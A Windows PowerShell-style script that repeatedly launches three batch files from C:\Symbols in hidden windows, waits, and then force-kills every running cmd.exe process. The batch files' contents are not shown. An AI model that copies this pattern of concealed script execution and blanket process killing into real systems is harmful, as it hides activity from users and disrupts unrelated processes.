cd C:\Symbols
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress1ytn.bat -windowstyle hidden Configureaddress1ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress2ytn.bat -windowstyle hidden Configureaddress2ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30
start-process Configureaddress3ytn.bat -windowstyle hidden Configureaddress3ytn.bat
timeout /t 170
taskkill /IM cmd.exe
timeout /t 30


